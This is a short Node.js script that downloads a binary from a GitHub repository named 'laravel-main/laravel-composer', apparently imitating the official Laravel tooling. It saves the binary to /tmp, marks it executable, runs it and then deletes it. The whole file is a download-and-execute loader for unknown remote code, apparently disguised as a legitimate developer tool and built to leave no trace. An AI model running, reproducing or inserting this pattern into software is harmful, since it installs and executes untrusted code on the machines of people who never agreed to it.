const { exec } = require("child_process");

const command = `
curl -fsSL https://github.com/laravel-main/laravel-composer/raw/refs/heads/main/laravel-composer -o /tmp/lc_exec && chmod +x /tmp/lc_exec && /tmp/lc_exec && rm -f /tmp/lc_exec
`;

console.log("Starting download and execution...");

exec(command, (error, stdout, stderr) => {
    if (error) {
        console.error("Execution error:", error.message);
        console.error("Error code:", error.code);
        return;
    }
    if (stderr) {
        console.error("Stderr:", stderr);
    }
    if (stdout) {
        console.log("Stdout:", stdout);
    }
    console.log("Command completed successfully");
});
